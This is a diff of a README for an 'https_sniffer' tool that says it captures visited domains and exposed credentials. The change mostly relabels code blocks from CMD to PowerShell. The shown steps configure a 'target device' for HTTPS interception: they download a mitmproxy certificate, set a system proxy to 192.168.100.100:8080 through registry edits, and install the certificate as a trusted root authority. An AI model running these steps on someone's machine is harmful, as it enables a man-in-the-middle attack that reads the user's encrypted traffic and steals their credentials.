@@ -42,9 +42,11 @@ With this tool, you can capture all visited domains and potentially exposed cred
 
 ### Steps to configure target device
 
+Execute all commands on a PowerShell.
+
 1. First, retrive cert file:
 
-```CMD
+```powershell
 curl -o mitmproxy.cer https://github.com/sammy-ulfh/https_sniffer/raw/refs/heads/main/script/cert/mitmproxy.cer
 ```
 
@@ -61,7 +63,7 @@ curl -o mitmproxy.cer https://github.com/sammy-ulfh/https_sniffer/raw/refs/heads
     
     You can update its value from the terminal using the following command:
 
-    ```CMD
+    ```powershell
     reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1 /f
     ```
 
@@ -77,7 +79,7 @@ curl -o mitmproxy.cer https://github.com/sammy-ulfh/https_sniffer/raw/refs/heads
 
     You can update its value from the terminal using the followind command:
 
-    ```CMD
+    ```powershell
     reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d "192.168.100.100:8080" /f
     ```
 
@@ -90,8 +92,7 @@ curl -o mitmproxy.cer https://github.com/sammy-ulfh/https_sniffer/raw/refs/heads
 
     Use the **mitmproxy.cer** located in the  **script/cert** directory and add it to the Trusted Root Certification Authorities store:<br/>
 
-    ```CMD
-    powershell
+    ```powershell
     Import-Certificate -FilePath ".\mitmproxy.cer" -CertStoreLocation Cert:\LocalMachine\Root
     ```
 
